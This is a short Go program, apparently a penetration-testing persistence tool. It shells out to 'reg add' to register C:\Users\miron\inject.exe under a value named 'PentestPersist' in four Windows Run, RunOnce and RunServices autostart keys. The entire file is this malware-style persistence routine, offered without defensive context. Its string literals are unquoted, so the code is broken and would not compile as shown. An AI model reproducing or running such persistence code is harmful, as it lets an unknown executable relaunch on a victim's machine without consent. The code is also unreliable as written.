package main

import (
    "fmt"
    "os/exec"
)

const (
    registry_RUN           = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    registry_RunOnce       = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    registry_RunServices    = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
    registry_RunServiceOnce = HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
)

func Add_ToRegistry() {
    command := func(registry string) {
        c := exec.Command("cmd", "/C", "reg", "add", registry, "/v", "PentestPersist", "/t", "REG_SZ", "/d", C:\Users\miron\inject.exe)
        if err := c.Run(); err != nil {
            fmt.Println("Error: ", err)
        } else {
            fmt.Println("[+] Successful add to", registry, "[+]")
        }
    }

    command(registry_RUN)
    command(registry_RunOnce)
    command(registry_RunServices)
    command(registry_RunServiceOnce)
}



func main() {
    Add_ToRegistry()
}
